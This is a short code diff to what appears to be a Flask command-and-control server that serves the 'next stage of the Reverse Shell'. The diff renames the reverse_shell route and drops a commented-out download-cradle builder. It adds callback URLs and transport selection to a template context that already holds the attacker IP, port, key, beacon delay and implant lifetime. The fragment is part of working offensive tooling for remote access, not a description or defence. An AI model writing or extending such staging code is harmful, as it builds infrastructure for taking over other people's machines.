@@ -482,18 +482,16 @@ def reload_modules():
 
 
 @app.route('/r', methods=["GET"])
-def reverse_shell():
+def payload_r():
     """Load next stage of the Reverse Shell"""
     context = {
-        #  "dl_cradle": build_cradle(
-        #      request.args,
-        #      flavor="hub",
-        #  ).replace('$K', '$R'),
         "IP": args.URI_HOST,
         "delay": 10,  # delay in seconds
         "lifetime": 3,  # lifetime in days
         "PORT": str(args.REC_PORT),
         "key": KEY,
+        "callback_url": callback_urls[request.args['t']],
+        "transport": request.args["t"],
         "symbol_name": symbol_name,
     }
     result = render_template(
